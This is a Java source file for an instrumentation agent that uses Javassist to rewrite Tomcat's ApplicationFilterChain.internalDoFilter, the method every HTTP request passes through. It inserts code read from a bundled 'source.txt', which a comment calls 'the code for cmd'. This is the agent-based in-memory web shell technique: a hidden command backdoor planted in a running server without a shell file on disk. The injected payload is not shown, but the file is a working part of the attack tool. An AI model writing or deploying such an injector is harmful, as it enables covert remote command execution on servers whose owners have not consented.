package priv.ga0weI.baseonagent;

import javassist.*;

import java.io.*;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class Transformerthings implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        byte [] classbytes=classfileBuffer;
        if (className.equals("org/apache/catalina/core/ApplicationFilterChain")){ // class from in jvm named as xxx/xxx/xxx/xxx
            try {
//                System.out.println("a request com and hook the ApplicationFilterChain");
                ClassPool classPool = ClassPool.getDefault();
//                System.out.println("classBeingRedefinefined is :"+classBeingRedefined.getName());// classBeingRedefined = null
                ClassClassPath classPath = new ClassClassPath(className.getClass());  //get className class's classpath
//                System.out.println("this class path :"+classPath.toString())    ;
                classPool.insertClassPath(classPath);  //add the classpath to classpool  To nextfind
//                System.out.println("classPool has :"+classPool.toString());
                if (classBeingRedefined!=null) //for avoide case of null, throw exception
                {
                    ClassClassPath classPath1 = new ClassClassPath(classBeingRedefined);
                    classPool.insertClassPath(classPath1);
                }
                CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");  //for xx.xx.xx
                CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");//filterchain dofilter actually implementation ,change it'code and for all request

                ctMethod.addLocalVariable("elapsedTime", CtClass.longType);
                ctMethod.insertBefore(readSource());//insert the code for cmd

                 classbytes=ctClass.toBytecode();//get changed code and return ,Notice  after the  method of  toBytecode,the ctClass will be forzen
                /*
                try get fileclass
                 */
                ctClass.detach();
                bytestoclass(classbytes,".\\tmp\\retransformed.class");//get changed class for check


            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return  classbytes;
    }

    /**
     * get the code ready for inject internalDoFilter
     * @return ready code
     */
    private String readSource() {
        StringBuilder source=new StringBuilder();
        InputStream is = Transformerthings.class.getClassLoader().getResourceAsStream("source.txt");
        InputStreamReader isr = new InputStreamReader(is);
        String line=null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while((line=br.readLine()) != null) {
                source.append(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return source.toString();
    }

    /**
     * output file for check
     * @param bytes
     * @param filename
     */
    private void bytestoclass(byte [] bytes,String filename) {
        try{
            File file = new File(".\\tmp");
            if (!file.exists())
                file.mkdir();
            FileOutputStream fos = new FileOutputStream(filename);
            fos.write(bytes);
            fos.flush();
            fos.close();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
